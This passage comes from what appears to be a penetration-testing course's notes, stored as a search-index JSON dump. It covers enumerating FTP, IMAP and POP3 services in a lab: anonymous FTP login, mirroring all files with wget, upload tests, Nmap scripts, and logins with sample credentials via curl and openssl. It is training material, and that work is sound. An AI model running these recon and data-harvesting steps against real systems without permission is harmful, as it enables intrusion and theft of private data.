Important\\ Notes.txt\n\nlocal: Important Notes.txt remote: Important Notes.txt\n200 PORT command successful. Consider using PASV.\n150 Opening BINARY mode data connection for Important Notes.txt (41 bytes).\n226 Transfer complete.\n41 bytes received in 0.00 secs (606.6525 kB/s)\n\n\nftp&gt; exit\n\n221 Goodbye.\n</code></pre> <pre><code>arenwald@htb[/htb]$ ls | grep Notes.txt\n\n'Important Notes.txt'\n</code></pre> <p>We also can download all the files and folders we have access to at once. This is especially useful if the FTP server has many different files in a larger folder structure. However, this can cause alarms because no one from the company usually wants to download all files and content all at once.</p>","tags":["Pentesting","Information_Gathering","FTP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/FTP%20%2821%29/Dangerous%20settings/#download-all-available-files","title":"Download All Available Files","text":"<pre><code>arenwald@htb[/htb]$ wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136\n\n--2021-09-19 14:45:58--  ftp://anonymous:*password*@10.129.14.136/                                         \n           =&gt; \u201810.129.14.136/.listing\u2019                                                                     \nConnecting to 10.129.14.136:21... connected.                                                               \nLogging in as anonymous ... Logged in!\n==&gt; SYST ... done.    ==&gt; PWD ... done.\n==&gt; TYPE I ... done.  ==&gt; CWD not needed.\n==&gt; PORT ... done.    ==&gt; LIST ... done.                                                                 \n12.12.1.136/.listing           [ &lt;=&gt;                                  ]     466  --.-KB/s    in 0s       \n\n2021-09-19 14:45:58 (65,8 MB/s) - \u201810.129.14.136/.listing\u2019 saved [466]                                     \n--2021-09-19 14:45:58--  ftp://anonymous:*password*@10.129.14.136/Calendar.pptx   \n           =&gt; \u201810.129.14.136/Calendar.pptx\u2019                                       \n==&gt; CWD not required.                                                           \n==&gt; SIZE Calendar.pptx ... done.                                                                                                                            \n==&gt; PORT ... done.    ==&gt; RETR Calendar.pptx ... done.       \n\n...SNIP...\n\n2021-09-19 14:45:58 (48,3 MB/s) - \u201810.129.14.136/Employees/.listing\u2019 saved [119]\n\nFINISHED --2021-09-19 14:45:58--\nTotal wall clock time: 0,03s\nDownloaded: 15 files, 1,7K in 0,001s (3,02 MB/s)\n</code></pre> <p>Once we have downloaded all the files,\u00a0<code>wget</code>\u00a0will create a directory with the name of the IP address of our target. All downloaded files are stored there, which we can then inspect locally.</p> <pre><code>arenwald@htb[/htb]$ tree .\n\n.\n\u2514\u2500\u2500 10.129.14.136\n    \u251c\u2500\u2500 Calendar.pptx\n    \u251c\u2500\u2500 Clients\n    \u2502   \u2514\u2500\u2500 Inlanefreight\n    \u2502       \u251c\u2500\u2500 appointments.xlsx\n    \u2502       \u251c\u2500\u2500 contract.docx\n    \u2502       \u251c\u2500\u2500 meetings.txt\n    \u2502       \u2514\u2500\u2500 proposal.pptx\n    \u251c\u2500\u2500 Documents\n    \u2502   \u251c\u2500\u2500 appointments-template.xlsx\n    \u2502   \u251c\u2500\u2500 contract-template.docx\n    \u2502   \u2514\u2500\u2500 contract-template.pdf\n    \u251c\u2500\u2500 Employees\n    \u2514\u2500\u2500 Important Notes.txt\n\n5 directories, 9 files\n</code></pre> <p>Next, we can check if we have the permissions to upload files to the FTP server. Especially with web servers, it is common that files are synchronized, and the developers have quick access to the files. FTP is often used for this purpose, and most of the time, configuration errors are found on servers that the administrators think are not discoverable. The attitude that internal network components cannot be accessed from the outside means that the hardening of internal systems is often neglected and leads to misconfigurations.</p> <p>The ability to upload files to the FTP server connected to a web server increases the likelihood of gaining direct access to the webserver and even a reverse shell that allows us to execute internal system commands and perhaps even escalate our privileges.</p>","tags":["Pentesting","Information_Gathering","FTP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/FTP%20%2821%29/Dangerous%20settings/#upload-a-file","title":"Upload a File","text":"<pre><code>arenwald@htb[/htb]$ touch testupload.txt\n</code></pre> <p>With the\u00a0<code>PUT</code>\u00a0command, we can upload files in the current folder to the FTP server.</p> <pre><code>ftp&gt; put testupload.txt \n\nlocal: testupload.txt remote: testupload.txt\n---&gt; PORT 10,10,14,4,184,33\n200 PORT command successful. Consider using PASV.\n---&gt; STOR testupload.txt\n150 Ok to send data.\n226 Transfer complete.\n\n\nftp&gt; ls\n\n---&gt; TYPE A\n200 Switching to ASCII mode.\n---&gt; PORT 10,10,14,4,223,101\n200 PORT command successful. Consider using PASV.\n---&gt; LIST\n150 Here comes the directory listing.\n-rw-rw-r--    1 1002     1002      8138592 Sep 14 16:54 Calender.pptx\ndrwxrwxr-x    2 1002     1002         4096 Sep 14 17:03 Clients\ndrwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Documents\ndrwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Employees\n-rw-rw-r--    1 1002     1002           41 Sep 14 16:45 Important Notes.txt\n-rw-------    1 1002     133             0 Sep 15 14:57 testupload.txt\n226 Directory send OK.\n</code></pre>","tags":["Pentesting","Information_Gathering","FTP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/FTP%20%2821%29/Footprinting%20the%20service/","title":"Footprinting the service","text":"<p>Footprinting using various network scanners is also a handy and widespread approach. These tools make it easier for us to identify different services, even if they are not accessible on standard ports. One of the most widely used tools for this purpose is Nmap. Nmap also brings the\u00a0Nmap Scripting Engine\u00a0(<code>NSE</code>), a set of many different scripts written for specific services. More information on the capabilities of Nmap and NSE can be found in the\u00a0Network Enumeration with Nmap\u00a0module. We can update this database of NSE scripts with the command shown.</p>","tags":["Pentesting","FTP","Information_Gathering"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/FTP%20%2821%29/Footprinting%20the%20service/#nmap-ftp-scripts","title":"Nmap FTP Scripts","text":"<pre><code>arenwald@htb[/htb]$ sudo nmap --script-updatedb\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 13:49 CEST\nNSE: Updating rule database.\nNSE: Script Database updated successfully.\nNmap done: 0 IP addresses (0 hosts up) scanned in 0.28 seconds\n</code></pre> <p>All the NSE scripts are located on the Pwnbox in\u00a0<code>/usr/share/nmap/scripts/</code>, but on our systems, we can find them using a simple command on our system.</p> <pre><code>arenwald@htb[/htb]$ find / -type f -name ftp* 2&gt;/dev/null | grep scripts\n\n/usr/share/nmap/scripts/ftp-syst.nse\n/usr/share/nmap/scripts/ftp-vsftpd-backdoor.nse\n/usr/share/nmap/scripts/ftp-vuln-cve2010-4221.nse\n/usr/share/nmap/scripts/ftp-proftpd-backdoor.nse\n/usr/share/nmap/scripts/ftp-bounce.nse\n/usr/share/nmap/scripts/ftp-libopie.nse\n/usr/share/nmap/scripts/ftp-anon.nse\n/usr/share/nmap/scripts/ftp-brute.nse\n</code></pre> <p>As we already know, the FTP server usually runs on the standard TCP port 21, which we can scan using Nmap. We also use the version scan (<code>-sV</code>), aggressive scan (<code>-A</code>), and the default script scan (<code>-sC</code>) against our target\u00a0<code>10.129.14.136</code>.</p>","tags":["Pentesting","FTP","Information_Gathering"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/FTP%20%2821%29/Footprinting%20the%20service/#nmap","title":"Nmap","text":"<pre><code>arenwald@htb[/htb]$ sudo nmap -sV -p21 -sC -A 10.129.14.136\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2021-09-16 18:12 CEST\nNmap scan report for 10.129.14.136\nHost is up (0.00013s latency).\n\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 2.0.8 or later\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n| -rwxrwxrwx    1 ftp      ftp       8138592 Sep 16 17:24 Calendar.pptx [NSE: writeable]\n| drwxrwxrwx    4 ftp      ftp          4096 Sep 16 17:57 Clients [NSE: writeable]\n| drwxrwxrwx    2 ftp      ftp          4096 Sep 16 18:05 Documents [NSE: writeable]\n| drwxrwxrwx    2 ftp      ftp          4096 Sep 16 17:24 Employees [NSE: writeable]\n| -rwxrwxrwx    1 ftp      ftp            41 Sep 16 17:24 Important Notes.txt [NSE: writeable]\n|_-rwxrwxrwx    1 ftp      ftp             0 Sep 15 14:57 testupload.txt [NSE: writeable]\n| ftp-syst: \n|   STAT: \n| FTP server status:\n|      Connected to 10.10.14.4\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 2\n|      vsFTPd 3.0.3 - secure, fast, stable\n|_End of status\n</code></pre> <p>The default script scan is based on the services' fingerprints, responses, and standard ports. Once Nmap has detected the service, it executes the marked scripts one after the other, providing different information. For example, the\u00a0ftp-anon\u00a0NSE script checks whether the FTP server allows anonymous access. If so, the contents of the FTP root directory are rendered for the anonymous user.</p> <p>The\u00a0<code>ftp-syst</code>, for example, executes the\u00a0<code>STAT</code>\u00a0command, which displays information about the FTP server status. This includes configurations as well as the version of the FTP server. Nmap also provides the ability to trace the progress of NSE scripts at the network level if we use the\u00a0<code>--script-trace</code>\u00a0option in our scans. This lets us see what commands Nmap sends, what ports are used, and what responses we receive from the scanned server.</p>","tags":["Pentesting","FTP","Information_Gathering"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/FTP%20%2821%29/Footprinting%20the%20service/#nmap-script-trace","title":"Nmap Script Trace","text":"<pre><code>arenwald@htb[/htb]$ sudo nmap -sV -p21 -sC -A 10.129.14.136 --script-trace\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 13:54 CEST                                                                                                                                                   \nNSOCK INFO [11.4640s] nsock_trace_handler_callback(): Callback: CONNECT SUCCESS for EID 8 [10.129.14.136:21]                                   \nNSOCK INFO [11.4640s] nsock_trace_handler_callback(): Callback: CONNECT SUCCESS for EID 16 [10.129.14.136:21]             \nNSOCK INFO [11.4640s] nsock_trace_handler_callback(): Callback: CONNECT SUCCESS for EID 24 [10.129.14.136:21]\nNSOCK INFO [11.4640s] nsock_trace_handler_callback(): Callback: CONNECT SUCCESS for EID 32 [10.129.14.136:21]\nNSOCK INFO [11.4640s] nsock_read(): Read request from IOD #1 [10.129.14.136:21] (timeout: 7000ms) EID 42\nNSOCK INFO [11.4640s] nsock_read(): Read request from IOD #2 [10.129.14.136:21] (timeout: 9000ms) EID 50\nNSOCK INFO [11.4640s] nsock_read(): Read request from IOD #3 [10.129.14.136:21] (timeout: 7000ms) EID 58\nNSOCK INFO [11.4640s] nsock_read(): Read request from IOD #4 [10.129.14.136:21] (timeout: 11000ms) EID 66\nNSE: TCP 10.10.14.4:54226 &gt; 10.129.14.136:21 | CONNECT\nNSE: TCP 10.10.14.4:54228 &gt; 10.129.14.136:21 | CONNECT\nNSE: TCP 10.10.14.4:54230 &gt; 10.129.14.136:21 | CONNECT\nNSE: TCP 10.10.14.4:54232 &gt; 10.129.14.136:21 | CONNECT\nNSOCK INFO [11.4660s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 50 [10.129.14.136:21] (41 bytes): 220 Welcome to HTB-Academy FTP service...\nNSOCK INFO [11.4660s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 58 [10.129.14.136:21] (41 bytes): 220 Welcome to HTB-Academy FTP service...\nNSE: TCP 10.10.14.4:54228 &lt; 10.129.14.136:21 | 220 Welcome to HTB-Academy FTP service.\n</code></pre> <p>The scan history shows that four different parallel scans are running against the service, with various timeouts. For the NSE scripts, we see that our local machine uses other output ports (<code>54226</code>,\u00a0<code>54228</code>,\u00a0<code>54230</code>,\u00a0<code>54232</code>) and first initiates the connection with the\u00a0<code>CONNECT</code>\u00a0command. From the first response from the server, we can see that we are receiving the banner from the server to our second NSE script (<code>54228</code>) from the target FTP server. If necessary, we can, of course, use other applications such as\u00a0<code>netcat</code>\u00a0or\u00a0<code>telnet</code>\u00a0to interact with the FTP server.</p>","tags":["Pentesting","FTP","Information_Gathering"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/FTP%20%2821%29/Footprinting%20the%20service/#service-interaction","title":"Service Interaction","text":"<pre><code>arenwald@htb[/htb]$ nc -nv 10.129.14.136 21\n</code></pre> <pre><code>arenwald@htb[/htb]$ telnet 10.129.14.136 21\n</code></pre> <p>It looks slightly different if the FTP server runs with TLS/SSL encryption. Because then we need a client that can handle TLS/SSL. For this, we can use the client\u00a0<code>openssl</code>\u00a0and communicate with the FTP server. The good thing about using\u00a0<code>openssl</code>\u00a0is that we can see the SSL certificate, which can also be helpful.</p> <pre><code>arenwald@htb[/htb]$ openssl s_client -connect 10.129.14.136:21 -starttls ftp\n\nCONNECTED(00000003)                                                                                      \nCan't use SSL_get_servername                        \ndepth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Dev, CN = master.inlanefreight.htb, emailAddress = admin@inlanefreight.htb\nverify error:num=18:self signed certificate\nverify return:1\n\ndepth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Dev, CN = master.inlanefreight.htb, emailAddress = admin@inlanefreight.htb\nverify return:1\n---                                                 \nCertificate chain\n 0 s:C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Dev, CN = master.inlanefreight.htb, emailAddress = admin@inlanefreight.htb\n\n i:C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Dev, CN = master.inlanefreight.htb, emailAddress = admin@inlanefreight.htb\n---\n\nServer certificate\n\n-----BEGIN CERTIFICATE-----\n\nMIIENTCCAx2gAwIBAgIUD+SlFZAWzX5yLs2q3ZcfdsRQqMYwDQYJKoZIhvcNAQEL\n...SNIP...\n</code></pre> <p>This is because the SSL certificate allows us to recognize the\u00a0<code>hostname</code>, for example, and in most cases also an\u00a0<code>email address</code>\u00a0for the organization or company. In addition, if the company has several locations worldwide, certificates can also be created for specific locations, which can also be identified using the SSL certificate.</p>","tags":["Pentesting","FTP","Information_Gathering"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/FTP%20%2821%29/vsFTPd/","title":"vsFTPd","text":"<p>One of the most used FTP servers on Linux-based distributions is\u00a0vsFTPd. The default configuration of vsFTPd can be found in\u00a0<code>/etc/vsftpd.conf</code>, and some settings are already predefined by default. It is highly recommended to install the vsFTPd server on a VM and have a closer look at this configuration.</p>","tags":["Pentesting","Information_Gathering","FTP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/FTP%20%2821%29/vsFTPd/#install-vsftpd","title":"Install vsFTPd","text":"<pre><code>arenwald@htb[/htb]$ sudo apt install vsftpd \n</code></pre> <p>The vsFTPd server is only one of a few FTP servers available to us. There are many different alternatives to it, which also bring, among other things, many more functions and configuration options with them. We will use the vsFTPd server because it is an excellent way to show the configuration possibilities of an FTP server in a simple and easy-to-understand way without going into the details of the man pages. If we look at the configuration file of vsFTPd, we will see many options and settings that are either commented or commented out. However, the configuration file does not contain all possible settings that can be made. The existing and missing ones can be found on the\u00a0man page.</p>","tags":["Pentesting","Information_Gathering","FTP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/FTP%20%2821%29/vsFTPd/#vsftpd-config-file","title":"vsFTPd Config File","text":"<pre><code>arenwald@htb[/htb]$ cat /etc/vsftpd.conf | grep -v \"#\"\n</code></pre> Setting Description <code>listen=NO</code> Run from inetd or as a standalone daemon? <code>listen_ipv6=YES</code> Listen on IPv6 ? <code>anonymous_enable=NO</code> Enable Anonymous access? <code>local_enable=YES</code> Allow local users to login? <code>dirmessage_enable=YES</code> Display active directory messages when users go into certain directories? <code>use_localtime=YES</code> Use local time? <code>xferlog_enable=YES</code> Activate logging of uploads/downloads? <code>connect_from_port_20=YES</code> Connect from port 20? <code>secure_chroot_dir=/var/run/vsftpd/empty</code> Name of an empty directory <code>pam_service_name=vsftpd</code> This string is the name of the PAM service vsftpd will use. <code>rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem</code> The last three options specify the location of the RSA certificate to use for SSL encrypted connections. <code>rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key</code> <code>ssl_enable=NO</code> <p>In addition, there is a file called\u00a0<code>/etc/ftpusers</code>\u00a0that we also need to pay attention to, as this file is used to deny certain users access to the FTP service. In the following example, the users\u00a0<code>guest</code>,\u00a0<code>john</code>, and\u00a0<code>kevin</code>\u00a0are not permitted to log in to the FTP service, even if they exist on the Linux system.</p>","tags":["Pentesting","Information_Gathering","FTP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/IMAP%20%28143%2C993%29%2CPOP3%20%28110%2C995%29/Commands/","title":"Commands","text":"","tags":["Pentesting","IMAP","Information_Gathering"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/IMAP%20%28143%2C993%29%2CPOP3%20%28110%2C995%29/Commands/#imap-commands","title":"IMAP Commands","text":"Command Description <code>1 LOGIN username password</code> User's login. <code>1 LIST \"\" *</code> Lists all directories. <code>1 CREATE \"INBOX\"</code> Creates a mailbox with a specified name. <code>1 DELETE \"INBOX\"</code> Deletes a mailbox. <code>1 RENAME \"ToRead\" \"Important\"</code> Renames a mailbox. <code>1 LSUB \"\" *</code> Returns a subset of names from the set of names that the User has declared as being <code>active</code> or <code>subscribed</code>. <code>1 SELECT INBOX</code> Selects a mailbox so that messages in the mailbox can be accessed. <code>1 UNSELECT INBOX</code> Exits the selected mailbox. <code>1 FETCH &lt;ID&gt; all</code> Retrieves data associated with a message in the mailbox. <code>1 CLOSE</code> Removes all messages with the <code>Deleted</code> flag set. <code>1 LOGOUT</code> Closes the connection with the IMAP server.","tags":["Pentesting","IMAP","Information_Gathering"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/IMAP%20%28143%2C993%29%2CPOP3%20%28110%2C995%29/Commands/#pop3-commands","title":"POP3 Commands","text":"Command Description <code>USER username</code> Identifies the user. <code>PASS password</code> Authentication of the user using its password. <code>STAT</code> Requests the number of saved emails from the server. <code>LIST</code> Requests from the server the number and size of all emails. <code>RETR id</code> Requests the server to deliver the requested email by ID. <code>DELE id</code> Requests the server to delete the requested email by ID. <code>CAPA</code> Requests the server to display the server capabilities. <code>RSET</code> Requests the server to reset the transmitted information. <code>QUIT</code> Closes the connection with the POP3 server.","tags":["Pentesting","IMAP","Information_Gathering"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/IMAP%20%28143%2C993%29%2CPOP3%20%28110%2C995%29/Dangerous%20Settings/","title":"Dangerous Settings","text":"<p>Nevertheless, configuration options that were improperly configured could allow us to obtain more information, such as debugging the executed commands on the service or logging in as anonymous, similar to the FTP service. Most companies use third-party email providers such as Google, Microsoft, and many others. However, some companies still use their own mail servers for many different reasons. One of these reasons is to maintain the privacy that they want to keep in their own hands. Many configuration mistakes can be made by administrators, which in the worst cases will allow us to read all the emails sent and received, which may even contain confidential or sensitive information. Some of these configuration options include:</p> Setting Description <code>auth_debug</code> Enables all authentication debug logging. <code>auth_debug_passwords</code> This setting adjusts log verbosity, the submitted passwords, and the scheme gets logged. <code>auth_verbose</code> Logs unsuccessful authentication attempts and their reasons. <code>auth_verbose_passwords</code> Passwords used for authentication are logged and can also be truncated. <code>auth_anonymous_username</code> This specifies the username to be used when logging in with the ANONYMOUS SASL mechanism.","tags":["Pentesting","IMAP","Information_Gathering"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/IMAP%20%28143%2C993%29%2CPOP3%20%28110%2C995%29/Default%20Configuration/","title":"Default Configuration","text":"<p>Both IMAP and POP3 have a large number of configuration options, making it difficult to deep dive into each component in more detail. If you wish to examine these protocol configurations deeper, we recommend creating a VM locally and install the two packages <code>dovecot-imapd</code>, and <code>dovecot-pop3d</code> using <code>apt</code> and play around with the configurations and experiment.</p> <p>In the documentation of Dovecot, we can find the individual core settings and service configuration options that can be utilized for our experiments. However, let us look at the list of commands and see how we can directly interact and communicate with IMAP and POP3 using the command line.</p>","tags":["Pentesting","Information_Gathering","IMAP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/IMAP%20%28143%2C993%29%2CPOP3%20%28110%2C995%29/Footprinting%20the%20Service/","title":"Footprinting the Service","text":"<p>By default, ports <code>110</code> and <code>995</code> are used for POP3, and ports <code>143</code> and <code>993</code> are used for IMAP. The higher ports (<code>993</code> and <code>995</code>) use TLS/SSL to encrypt the communication between the client and server. Using Nmap, we can scan the server for these ports. The scan will return the corresponding information (as seen below) if the server uses an embdedded certificate.</p>","tags":["Pentesting","Information_Gathering","IMAP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/IMAP%20%28143%2C993%29%2CPOP3%20%28110%2C995%29/Footprinting%20the%20Service/#nmap","title":"Nmap","text":"<pre><code>arenwald@htb[/htb]$ sudo nmap 10.129.14.128 -sV -p110,143,993,995 -sC\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 22:09 CEST\nNmap scan report for 10.129.14.128\nHost is up (0.00026s latency).\n\nPORT    STATE SERVICE  VERSION\n110/tcp open  pop3     Dovecot pop3d\n|_pop3-capabilities: AUTH-RESP-CODE SASL STLS TOP UIDL RESP-CODES CAPA PIPELINING\n| ssl-cert: Subject: commonName=mail1.inlanefreight.htb/organizationName=Inlanefreight/stateOrProvinceName=California/countryName=US\n| Not valid before: 2021-09-19T19:44:58\n|_Not valid after:  2295-07-04T19:44:58\n143/tcp open  imap     Dovecot imapd\n|_imap-capabilities: more have post-login STARTTLS Pre-login capabilities LITERAL+ LOGIN-REFERRALS OK LOGINDISABLEDA0001 SASL-IR ENABLE listed IDLE ID IMAP4rev1\n| ssl-cert: Subject: commonName=mail1.inlanefreight.htb/organizationName=Inlanefreight/stateOrProvinceName=California/countryName=US\n| Not valid before: 2021-09-19T19:44:58\n|_Not valid after:  2295-07-04T19:44:58\n993/tcp open  ssl/imap Dovecot imapd\n|_imap-capabilities: more have post-login OK capabilities LITERAL+ LOGIN-REFERRALS Pre-login AUTH=PLAINA0001 SASL-IR ENABLE listed IDLE ID IMAP4rev1\n| ssl-cert: Subject: commonName=mail1.inlanefreight.htb/organizationName=Inlanefreight/stateOrProvinceName=California/countryName=US\n| Not valid before: 2021-09-19T19:44:58\n|_Not valid after:  2295-07-04T19:44:58\n995/tcp open  ssl/pop3 Dovecot pop3d\n|_pop3-capabilities: AUTH-RESP-CODE USER SASL(PLAIN) TOP UIDL RESP-CODES CAPA PIPELINING\n| ssl-cert: Subject: commonName=mail1.inlanefreight.htb/organizationName=Inlanefreight/stateOrProvinceName=California/countryName=US\n| Not valid before: 2021-09-19T19:44:58\n|_Not valid after:  2295-07-04T19:44:58\nMAC Address: 00:00:00:00:00:00 (VMware)\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 12.74 seconds\n</code></pre> <p>For example, from the output, we can see that the common name is <code>mail1.inlanefreight.htb</code>, and the email server belongs to the organization <code>Inlanefreight</code>, which is located in California. The displayed capabilities show us the commands available on the server and for the service on the corresponding port.</p> <p>If we successfully figure out the access credentials for one of the employees, an attacker could log in to the mail server and read or even send the individual messages.</p>","tags":["Pentesting","Information_Gathering","IMAP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/IMAP%20%28143%2C993%29%2CPOP3%20%28110%2C995%29/Footprinting%20the%20Service/#curl","title":"cURL","text":"<pre><code>arenwald@htb[/htb]$ curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd\n\n* LIST (\\HasNoChildren) \".\" Important\n* LIST (\\HasNoChildren) \".\" INBOX\n</code></pre> <p>If we also use the <code>verbose</code> (<code>-v</code>) option, we will see how the connection is made. From this, we can see the version of TLS used for encryption, further details of the SSL certificate, and even the banner, which will often contain the version of the mail server.</p> <pre><code>arenwald@htb[/htb]$ curl -k 'imaps://10.129.14.128' --user cry0l1t3:1234 -v\n\n*   Trying 10.129.14.128:993...\n* TCP_NODELAY set\n* Connected to 10.129.14.128 (10.129.14.128) port 993 (#0)\n* successfully set certificate verify locations:\n*   CAfile: /etc/ssl/certs/ca-certificates.crt\n  CApath: /etc/ssl/certs\n* TLSv1.3 (OUT), TLS handshake, Client hello (1):\n* TLSv1.3 (IN), TLS handshake, Server hello (2):\n* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):\n* TLSv1.3 (IN), TLS handshake, Certificate (11):\n* TLSv1.3 (IN), TLS handshake, CERT verify (15):\n* TLSv1.3 (IN), TLS handshake, Finished (20):\n* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):\n* TLSv1.3 (OUT), TLS handshake, Finished (20):\n* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384\n* Server certificate:\n*  subject: C=US; ST=California; L=Sacramento; O=Inlanefreight; OU=Customer Support; CN=mail1.inlanefreight.htb; emailAddress=cry0l1t3@inlanefreight.htb\n*  start date: Sep 19 19:44:58 2021 GMT\n*  expire date: Jul  4 19:44:58 2295 GMT\n*  issuer: C=US; ST=California; L=Sacramento; O=Inlanefreight; OU=Customer Support; CN=mail1.inlanefreight.htb; emailAddress=cry0l1t3@inlanefreight.htb\n*  SSL certificate verify result: self signed certificate (18), continuing anyway.\n* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):\n* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):\n* old SSL session ID is stale, removing\n&lt; * OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] HTB-Academy IMAP4 v.0.21.4\n&gt; A001 CAPABILITY\n&lt; * CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN\n&lt; A001 OK Pre-login capabilities listed, post-login capabilities have more.\n&gt; A002 AUTHENTICATE PLAIN AGNyeTBsMXQzADEyMzQ=\n&lt; * CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-USE\n&lt; A002 OK Logged in\n&gt; A003 LIST \"\" *\n&lt; * LIST (\\HasNoChildren) \".\" Important\n* LIST (\\HasNoChildren) \".\" Important\n&lt; * LIST (\\HasNoChildren) \".\" INBOX\n* LIST (\\HasNoChildren) \".\" INBOX\n&lt; A003 OK List completed (0.001 + 0.000 secs).\n* Connection #0 to host 10.129.14.128 left intact\n</code></pre> <p>To interact with the IMAP or POP3 server over SSL, we can use <code>openssl</code>, as well as <code>ncat</code>. The commands for this would look like this:</p>","tags":["Pentesting","Information_Gathering","IMAP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/IMAP%20%28143%2C993%29%2CPOP3%20%28110%2C995%29/Footprinting%20the%20Service/#openssl-tls-encrypted-interaction-pop3","title":"OpenSSL - TLS Encrypted Interaction POP3","text":"<pre><code>arenwald@htb[/htb]$ openssl s_client -connect 10.129.14.128:pop3s\n\nCONNECTED(00000003)\nCan't use SSL_get_servername\ndepth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb\nverify error:num=18:self signed certificate\nverify return:1\ndepth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb\nverify return:1\n---\nCertificate chain\n 0 s:C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb\n\n...SNIP...\n\n---\nread R BLOCK\n---\nPost-Handshake New Session Ticket arrived:\nSSL-Session:\n    Protocol  : TLSv1.3\n    Cipher    : TLS_AES_256_GCM_SHA384\n    Session-ID: 3CC39A7F2928B252EF2FFA5462140B1A0A74B29D4708AA8DE1515BB4033D92C2\n    Session-ID-ctx:\n    Resumption PSK: 68419D933B5FEBD878FF1BA399A926813BEA3652555E05F0EC75D65819A263AA25FA672F8974C37F6446446BB7EA83F9\n    PSK identity: None\n    PSK identity hint: None\n    SRP username: None\n    TLS session ticket lifetime hint: 7200 (seconds)\n    TLS session ticket:\n    0000 - d7 86 ac 7e f3 f4 95 35-88 40 a5 b5 d6 a6 41 e4   ...~...5.@....A.\n    0010 - 96 6c e6 12 4f 50 ce 72-36 25 df e1 72 d9 23 94   .l..OP.r6%..r.#.\n    0020 - cc 29 90 08 58 1b 57 ab-db a8 6b f7 8f 31 5b ad   .)..X.W...k..1[.\n    0030 - 47 94 f4 67 58 1f 96 d9-ca ca 56 f9 7a 12 f6 6d   G..gX.....V.z..m\n    0040 - 43 b9 b6 68 de db b2 47-4f 9f 48 14 40 45 8f 89   C..h...GO.H.@E..\n    0050 - fa 19 35 9c 6d 3c a1 46-5c a2 65 ab 87 a4 fd 5e   ..5.m&lt;.F\\.e....^\n    0060 - a2 95 25 d4 43 b8 71 70-40 6c fe 6f 0e d1 a0 38   ..%.C.qp@l.o...8\n    0070 - 6e bd 73 91 ed 05 89 83-f5 3e d9 2a e0 2e 96 f8   n.s......&gt;.*....\n    0080 - 99 f0 50 15 e0 1b 66 db-7c 9f 10 80 4a a1 8b 24   ..P...f.|...J..$\n    0090 - bb 00 03 d4 93 2b d9 95-64 44 5b c2 6b 2e 01 b5   .....+..dD[.k...\n    00a0 - e8 1b f4 a4 98 a7 7a 7d-0a 80 cc 0a ad fe 6e b3   ......z}......n.\n    00b0 - 0a d6 50 5d 